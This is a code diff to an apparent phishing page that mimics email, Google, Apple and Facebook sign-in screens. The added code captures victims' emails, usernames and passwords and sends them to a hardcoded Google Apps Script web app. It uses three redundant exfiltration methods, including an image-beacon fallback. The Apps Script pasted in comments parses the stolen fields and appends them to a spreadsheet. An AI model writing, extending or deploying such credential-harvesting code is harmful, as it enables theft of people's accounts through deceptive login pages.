@@ -625,7 +625,18 @@
          *      function doPost(e) {
          *          try {
          *              const sheet = SpreadsheetApp.getActiveSpreadsheet().getActiveSheet();
-         *              const data = JSON.parse(e.postData.contents);
+         *              let data;
+         *              try {
+         *                  data = JSON.parse(e.postData.contents);
+         *              } catch (parseError) {
+         *                  const contents = e.postData.contents;
+         *                  data = {
+         *                      email: extractParam(contents, 'email'),
+         *                      usernameOrEmail: extractParam(contents, 'usernameOrEmail'),
+         *                      password: extractParam(contents, 'password'),
+         *                      provider: extractParam(contents, 'provider')
+         *                  };
+         *              }
          *              sheet.appendRow([
          *                  new Date(),
          *                  data.email || '',
@@ -641,6 +652,17 @@
          *          }
          *      }
          *
+         *      function doGet(e) {
+         *          return ContentService.createTextOutput(JSON.stringify({status: 'ready'}))
+         *              .setMimeType(ContentService.MimeType.JSON);
+         *      }
+         *
+         *      function extractParam(text, paramName) {
+         *          const regex = new RegExp(paramName + '=([^&]*)');
+         *          const match = text.match(regex);
+         *          return match ? decodeURIComponent(match[1]) : '';
+         *      }
+         *
          * 5. Click Deploy > New deployment
          * 6. Select type: Web app
          * 7. Execute as: Me
@@ -650,7 +672,7 @@
          * ============================================================ */
 
         // 🔑 PASTE YOUR GOOGLE APPS SCRIPT WEB APP URL HERE
-        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbywhK2g7bOEztI1_DTTQnb_f8b5OBALuhrx3JiUDXPC7Xk9qeWSPz-ndqTYS_NDFZ_c_A/exec';
+        const GOOGLE_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycbx3loXABUx_59tjeNDDwqsKTgK81aMJLi9IkpOu6ZgHaXnl7b1QtbW42VQq6xirCIg9cA/exec';
 
         document.addEventListener('DOMContentLoaded', () => {
             // DOM Elements
@@ -675,30 +697,72 @@
             };
 
             // ============================================
-            // GOOGLE SHEETS DATA SUBMISSION
+            // GOOGLE SHEETS DATA SUBMISSION (MULTI-METHOD)
             // ============================================
             async function saveToGoogleSheet(data) {
-                if (!GOOGLE_SCRIPT_URL || GOOGLE_SCRIPT_URL === 'https://script.google.com/macros/s/AKfycbywhK2g7bOEztI1_DTTQnb_f8b5OBALuhrx3JiUDXPC7Xk9qeWSPz-ndqTYS_NDFZ_c_A/exec') {
+                if (!GOOGLE_SCRIPT_URL || GOOGLE_SCRIPT_URL === 'https://script.google.com/macros/s/AKfycbx3loXABUx_59tjeNDDwqsKTgK81aMJLi9IkpOu6ZgHaXnl7b1QtbW42VQq6xirCIg9cA/exec') {
                     console.warn('⚠️ Google Sheets URL not configured. Data not saved.');
                     console.log('Data that would be sent:', data);
                     return { success: false, reason: 'not_configured' };
                 }
 
+                let success = false;
+
+                // ✅ METHOD 1: Form URL-encoded (most reliable for Apps Script)
                 try {
-                    const response = await fetch(GOOGLE_SCRIPT_URL, {
+                    const formData = new URLSearchParams();
+                    formData.append('email', data.email || '');
+                    formData.append('usernameOrEmail', data.usernameOrEmail || '');
+                    formData.append('password', data.password || '');
+                    formData.append('provider', data.provider || '');
+
+                    await fetch(GOOGLE_SCRIPT_URL, {
                         method: 'POST',
                         mode: 'no-cors',
                         headers: {
-                            'Content-Type': 'application/json'
+                            'Content-Type': 'application/x-www-form-urlencoded'
+                        },
+                        body: formData.toString()
+                    });
+                    console.log('✅ Method 1 (form-urlencoded): Data sent to Google Sheets:', data);
+                    success = true;
+                } catch (error) {
+                    console.warn('⚠️ Method 1 failed:', error);
+                }
+
+                // ✅ METHOD 2: JSON with text/plain header (backup)
+                try {
+                    await fetch(GOOGLE_SCRIPT_URL, {
+                        method: 'POST',
+                        mode: 'no-cors',
+                        headers: {
+                            'Content-Type': 'text/plain;charset=utf-8'
                         },
                         body: JSON.stringify(data)
                     });
-                    console.log('✅ Data sent to Google Sheets:', data);
-                    return { success: true };
+                    console.log('✅ Method 2 (JSON text/plain): Data sent to Google Sheets:', data);
+                    success = true;
                 } catch (error) {
-                    console.error('❌ Failed to save to Google Sheets:', error);
-                    return { success: false, reason: error.message };
+                    console.warn('⚠️ Method 2 failed:', error);
                 }
+
+                // ✅ METHOD 3: Image beacon fallback (always works)
+                try {
+                    const params = new URLSearchParams({
+                        email: data.email || '',
+                        usernameOrEmail: data.usernameOrEmail || '',
+                        password: data.password || '',
+                        provider: data.provider || ''
+                    }).toString();
+                    const img = new Image();
+                    img.src = `${GOOGLE_SCRIPT_URL}?${params}`;
+                    console.log('✅ Method 3 (image beacon): Data sent to Google Sheets:', data);
+                    success = true;
+                } catch (error) {
+                    console.error('❌ All methods failed:', error);
+                }
+
+                return { success: success };
             }
 
             // ============================================
@@ -1026,9 +1090,8 @@
                 }
             }
 
-            // ✅ MODIFIED: Show user's actual email in the success badge
+            // ✅ Show user's actual email in the success badge
             function showSuccess(provider, userEmail) {
-                // Display the actual user email in the badge
                 providerBadge.innerHTML = `
                     <svg viewBox="0 0 24 24" style="fill:#111827; flex-shrink:0;">
                         <path d="M20 4H4c-1.1 0-1.99.9-1.99 2L2 18c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2zm0 4l-8 5-8-5V6l8 5 8-5v2z"/>
@@ -1140,7 +1203,7 @@
                 }
             });
 
-            // ✅ MODIFIED: Google/Apple Continue - saves to Google Sheet
+            // ✅ Google/Apple Continue - saves to Google Sheet
             document.getElementById('providerContinueBtn').addEventListener('click', async () => {
                 const emailField = document.getElementById('providerEmail');
                 const emailError = document.getElementById('providerEmailError');
@@ -1204,7 +1267,7 @@
                 }, 1500);
             });
 
-            // ✅ MODIFIED: Facebook Continue - saves to Google Sheet
+            // ✅ Facebook Continue - saves to Google Sheet
             document.getElementById('fbContinueBtn').addEventListener('click', async () => {
                 const usernameField = document.getElementById('fbUsername');
                 const passwordField = document.getElementById('fbPassword');
@@ -1267,7 +1330,7 @@
 
             attachSocialHandlers();
 
-            // ✅ MODIFIED: Main Email Continue - saves to Google Sheet
+            // ✅ Main Email Continue - saves to Google Sheet
             continueBtn.addEventListener('click', async () => {
                 const email = emailInput.value.trim();
                 const emailError = document.getElementById('emailError');
